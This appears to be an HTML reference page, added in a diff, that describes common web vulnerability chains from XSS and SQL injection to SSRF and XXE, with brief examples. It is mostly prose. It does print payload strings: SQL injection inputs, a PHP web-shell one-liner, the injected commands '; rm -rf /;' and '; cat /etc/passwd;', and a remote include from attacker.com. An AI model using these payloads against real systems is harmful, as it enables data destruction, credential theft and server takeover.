@@ -1,0 +1,161 @@
+<h1 id="common-web-vulnerability-chains-with-examples">Common Web Vulnerability Chains with Examples</h1>
+<h3 id="table-of-contents">table of contents</h3>
+<ul>
+<li><p><a href="#1-cross-site-scripting-xss">1. Cross-Site Scripting (XSS)</a></p>
+</li>
+<li><p><a href="#2-sql-injection-sqli">2. SQL Injection (SQLi)</a></p>
+</li>
+<li><p><a href="#3-local-file-inclusion-lfi">3. Local File Inclusion (LFI)</a></p>
+</li>
+<li><p><a href="#4-remote-file-inclusion-rfi">4. Remote File Inclusion (RFI)</a></p>
+</li>
+<li><p><a href="#5-cross-site-request-forgery-csrf">5. Cross-Site Request Forgery (CSRF)</a></p>
+</li>
+<li><p><a href="#6-command-injection">6. Command Injection</a></p>
+</li>
+<li><p><a href="#7-server-side-request-forgery-ssrf">7. Server-Side Request Forgery (SSRF)</a></p>
+</li>
+<li><p><a href="#8-insecure-deserialization">8. Insecure Deserialization</a></p>
+</li>
+<li><p><a href="#9-xml-external-entity-xxe">9. XML External Entity (XXE)</a></p>
+</li>
+<li><p><a href="#10-clickjacking">10. Clickjacking</a></p>
+</li>
+<li><p><a href="#11-self-xss">11. Self-XSS </a></p>
+</li>
+</ul>
+<h2 id="1-cross-site-scripting-xss-">1. Cross-Site Scripting (XSS)</h2>
+<p>  <strong>XSS → Session Hijacking → Privilege Escalation</strong> <code>Example:</code></p>
+<ul>
+<li>A comment section on a website is vulnerable to stored XSS.</li>
+<li>An attacker posts a comment containing a malicious script that steals session cookies when viewed by other users.</li>
+<li><p>The script sends the session cookie to the attacker, who then uses it to impersonate the user and escalate privileges.</p>
+<p><strong>XSS → CSRF → Account Takeover</strong> <code>Example:</code></p>
+</li>
+</ul>
+<ul>
+<li>A web application allows users to update their email without CSRF protection.</li>
+<li>The attacker sends a link with an embedded XSS payload to the victim.</li>
+<li><p>When the victim clicks the link, the XSS payload executes a CSRF attack, changing
+the victim’s email address.</p>
+<p><strong>XSS → LFI/RFI → RCE</strong> <code>Example:</code></p>
+</li>
+</ul>
+<ul>
+<li>An attacker finds an XSS vulnerability in a search feature and exploits it to inject a script that exploits an RFI vulnerability.</li>
+<li>The RFI payload points to an external malicious script, which gets executed on the server, leading to RCE.</li>
+</ul>
+<h2 id="2-sql-injection-sqli-">2. SQL Injection (SQLi)</h2>
+<p>  <strong>SQLi → Data Exfiltration → Credential Theft</strong> <code>Example:</code></p>
+<p>  -An attacker injects <code>OR 1=1</code> into a login form.
+  -This bypasses authentication and returns all user records, revealing usernames and hashed passwords.</p>
+<p>  <strong>SQLi → Authentication Bypass → Privilege Escalation</strong> <code>Example:</code></p>
+<p>  -Injecting <code>&#39; OR &#39;1&#39;=&#39;1</code> into a login form bypasses authentication.
+  -The attacker gains access to the application with administrative privileges.</p>
+<p>  <strong>SQLi → RCE</strong> <code>Example:</code></p>
+<p>  -The application has a vulnerable SQL query that allows executing commands(e.g., <code>xp_cmdshell</code> in SQL Server).
+  -The attacker injects <code>; exec xp_cmdshell(&#39;dir&#39;); --</code> to execute commands on the server.</p>
+<p>  <strong>SQLi → LFI</strong> <code>Example:</code></p>
+<p>  -An attacker exploits SQLi to read a file from the server, such as the application configuration file.
+  -The query <code>UNION SELECT LOAD_FILE(&#39;/etc/passwd&#39;)</code> reveals sensitive information, enabling further attacks.</p>
+<h2 id="3-local-file-inclusion-lfi-">3. Local File Inclusion (LFI)</h2>
+<p>  <strong>LFI → Information Disclosure → Credential Theft</strong> <code>Example:</code></p>
+<ul>
+<li>An attacker exploits LFI to read <code>/etc/passwd</code> and <code>/var/www/html/config.php</code>.</li>
+<li><p>This reveals database credentials stored in the configuration file.</p>
+<p><strong>LFI → RCE</strong> <code>Example:</code></p>
+</li>
+</ul>
+<ul>
+<li>LFI is used to include <code>/proc/self/environ</code> or logs containing PHP code injected by the attacker.</li>
+<li>The attacker injects <code>&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</code> into the logs and includes the log file to achieve RCE.</li>
+</ul>
+<h2 id="4-remote-file-inclusion-rfi-">4. Remote File Inclusion (RFI)</h2>
+<p>  <strong>RFI → Web Shell Upload → Persistent Backdoor</strong> <code>Example:</code></p>
+<ul>
+<li>An attacker includes a remote script that uploads a PHP web shell to the server.</li>
+<li><p>The attacker accesses the web shell at <code>http://example.com/shell.php</code>, maintaining persistent control.</p>
+<p><strong>RFI → RCE</strong> <code>Example:</code></p>
+</li>
+<li><p>An RFI vulnerability allows including <code>http://attacker.com/shell.php</code>.</p>
+</li>
+<li>The included script contains malicious code that executes commands on the server.</li>
+</ul>
+<h2 id="5-cross-site-request-forgery-csrf-">5. Cross-Site Request Forgery (CSRF)</h2>
+<p>  <strong>CSRF → Account Takeover → Business Logic Abuse</strong> <code>Example:</code></p>
+<ul>
+<li>The attacker crafts a malicious form that changes the user’s password.</li>
+<li><p>When the victim submits the form, their password is changed without their knowledge.</p>
+<p><strong>CSRF → XSS Injection</strong> <code>Example:</code></p>
+</li>
+</ul>
+<ul>
+<li>The attacker crafts a malicious form that injects a script into the user&#39;s profile.</li>
+<li>When the victim submits the form, the script is stored and executed whenever the profile is viewed.</li>
+</ul>
+<h2 id="6-command-injection">6. Command Injection</h2>
+<p>  <strong>Command Injection → RCE</strong> <code>Example:</code></p>
+<p>  A web application passes user input to a system shell without sanitization.
+  The attacker injects <code>; rm -rf /;</code> into the input field, causing arbitrary
+  commands to be executed.</p>
+<p>  <strong>Command Injection → Data Exfiltration</strong> <code>Example:</code></p>
+<p>  An attacker injects <code>; cat /etc/passwd;</code> into a vulnerable input field.
+  The command reveals sensitive information that the attacker can exfiltrate.</p>
+<h2 id="7-server-side-request-forgery-ssrf-">7. Server-Side Request Forgery (SSRF)</h2>
+<p>  <strong>SSRF → Internal Network Scanning → Pivoting</strong> <code>Example:</code></p>
+<ul>
+<li>An SSRF vulnerability allows the attacker to send requests to internal IP addresses.</li>
+<li><p>The attacker discovers internal services and exploits them to pivot deeper into the network.</p>
+<p><strong>SSRF → Metadata Service Access → Cloud Account Takeover</strong> <code>Example:</code></p>
+</li>
+<li><p>Exploiting SSRF to access the cloud provider&#39;s metadata service.</p>
+</li>
+<li>The attacker retrieves IAM credentials, gaining control over the cloud account.</li>
+</ul>
+<h2 id="8-insecure-deserialization">8. Insecure Deserialization</h2>
+<p>  <strong>Insecure Deserialization → RCE</strong> <code>Example:</code></p>
+<ul>
+<li>The application deserializes untrusted data.</li>
+<li><p>The attacker crafts a serialized payload that executes arbitrary code upon deserialization.</p>
+<p><strong>Insecure Deserialization → Authentication Bypass</strong> <code>Example:</code></p>
+</li>
+<li><p>The attacker manipulates a serialized object to escalate their privileges.</p>
+</li>
+<li>Upon deserialization, the attacker gains administrative access.</li>
+</ul>
+<h2 id="9-xml-external-entity-xxe-">9. XML External Entity (XXE)</h2>
+<p>  <strong>XXE → File Disclosure → Credential Theft</strong> <code>Example:</code></p>
+<ul>
+<li>An XXE payload in an XML file retrieves <code>/etc/passwd</code>.</li>
+<li><p>The attacker uses this information to further compromise the system.</p>
+<p><strong>XXE → SSRF</strong> <code>Example:</code></p>
+</li>
+<li><p>An XXE payload makes internal HTTP requests.</p>
+</li>
+<li><p>The attacker discovers internal services and potentially exploits them.</p>
+<p><strong>XXE → Denial of Service (DoS)</strong> <code>Example:</code></p>
+</li>
+<li><p>An XXE payload triggers a billion laughs attack, consuming server resources and causing a DoS.</p>
+</li>
+</ul>
+<h2 id="10-clickjacking">10. Clickjacking</h2>
+<p>  <strong>Clickjacking → CSRF → Account Takeover</strong> <code>Example:</code></p>
+<ul>
+<li>The attacker overlays a transparent iframe over a legitimate website.</li>
+<li><p>The victim unknowingly clicks on buttons that trigger CSRF attacks.</p>
+<p><strong>Clickjacking → XSS Injection</strong> <code>Example:</code></p>
+</li>
+<li><p>The attacker uses clickjacking to trick the victim into clicking on elements that inject XSS payloads.</p>
+</li>
+</ul>
+<h2 id="11-self-xss">11. Self-XSS</h2>
+<p>  <strong>Self-XSS → Credential Theft</strong> <code>Example:</code></p>
+<ul>
+<li>The attacker convinces the victim to paste a malicious script into their browser console.</li>
+<li><p>The script sends the victim&#39;s session cookies to the attacker.</p>
+<p><strong>Self-XSS → Account Takeover</strong> <code>Example:</code></p>
+</li>
+<li><p>The victim runs a script that changes their account settings.</p>
+</li>
+<li>The attacker gains control over the victim&#39;s account by changing the email address and password.</li>
+</ul>
